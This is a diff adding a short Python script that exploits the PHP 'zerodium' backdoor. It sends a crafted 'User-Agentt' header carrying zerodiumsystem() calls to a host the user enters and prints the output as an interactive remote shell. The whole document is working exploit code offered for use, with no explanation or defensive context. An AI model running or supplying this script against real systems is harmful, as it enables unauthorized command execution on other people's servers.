@@ -1,0 +1,47 @@
+#!/usr/bin/env python3
+import os
+import requests
+
+# Get user input for the host URL
+host = input("Enter the full host URL:\n")
+
+# Create a session for the requests
+request = requests.Session()
+
+# Send a GET request to the host
+response = request.get(host)
+
+# Check if the response is successful (status code 200)
+if response.status_code == 200:
+    print(f"\nInteractive shell is opened on {host}")
+    print("Can't access tty; job control turned off.")
+    
+    try:
+        # Start an interactive loop to execute commands
+        while True:
+            cmd = input("$ ")
+
+            # Set the necessary headers to exploit the vulnerability
+            headers = {
+                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
+                "User-Agentt": f"zerodiumsystem('{cmd}');"
+            }
+
+            # Send the request with the malicious User-Agentt header
+            response = request.get(host, headers=headers, allow_redirects=False)
+            
+            # Extract and print the response output
+            current_page = response.text
+            stdout = current_page.split('<!DOCTYPE html>', 1)
+            
+            # Print the output before the HTML part
+            print(stdout[0])
+
+    except KeyboardInterrupt:
+        print("\nExiting...")  # Gracefully handle CTRL+C to exit
+        exit(0)
+
+else:
+    print(f"\n{response}")
+    print("Host is not available, aborting...")
+    exit(1)
